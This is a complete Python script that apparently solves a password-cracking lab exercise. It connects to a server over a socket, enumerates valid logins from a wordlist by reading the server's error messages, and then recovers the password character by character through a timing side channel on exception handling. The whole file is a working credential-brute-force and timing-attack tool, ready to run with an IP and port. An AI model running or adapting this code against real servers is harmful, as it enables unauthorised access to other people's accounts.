import socket
import argparse
import string
import json
import time

POSSIBLE_CHARS = string.ascii_letters + string.digits


def get_args():
    parser = argparse.ArgumentParser(description='Connect to a server socket.')
    parser.add_argument('ip', help='IP address of the server to connect to')
    parser.add_argument('port', type=int, help="Server socket port number")

    return parser.parse_args()


def get_line(filename):
    """
    Custom generator for lines of a file

    :param filename:
    :yield file lines:
    """
    with open(filename) as file:
        for line in file.readlines():
            yield line.rstrip('\n')


def crack_password(address: tuple):
    """
    Return json object consisting of correct login and password for server

    Creates a socket and connects to address provided in parameters. Finds the login by trying every standard login from
    logins.txt file and an empty password. Once correct login is found, it is used to search for a password. We start
    from trying passwords of length 1. If server returns the message "Exception happened during login", it means that
    our attempted password matches the beginning of the correct password. If server response is taking longer than usual
    it means that the admin caught this exception (Catching exceptions usually takes a long time). We use this flaw to
    look for the right password by increasing the number of characters in our attempted password until we encounter
    the response "Connection success!". We then return a json object with the correct login and password

    :param address:
    :return json_object:
    """
    with socket.socket() as client_socket:
        client_socket.connect(address)

        for line in get_line('logins.txt'):
            request = json.dumps({"login": line, "password": " "})
            client_socket.send(request.encode())
            response = json.loads(client_socket.recv(1024).decode())
            if response["result"] == "Wrong password!":  # Usual response would be "Wrong login", meaning we found the correct one
                login = line
                break

        password = ''
        while True:
            for char in POSSIBLE_CHARS:
                password_attempt = password + char
                request = json.dumps({"login": login, "password": password_attempt})
                client_socket.send(request.encode())

                start = time.perf_counter()
                response = json.loads(client_socket.recv(1024).decode())
                end = time.perf_counter()
                total = end - start  # measures time of server response

                if total > 0.01:  # if receiving the response took longer than it should, it means that the admin caught
                    # the exception that occurs when we enter a password that matches the beginning of the correct password
                    password = password_attempt
                    break
                if response["result"] == "Connection success!":
                    return json.dumps({"login": login, "password": password_attempt})


def main():
    args = get_args()
    address = args.ip, args.port
    result = crack_password(address)

    print(result)


if __name__ == '__main__':
    main()
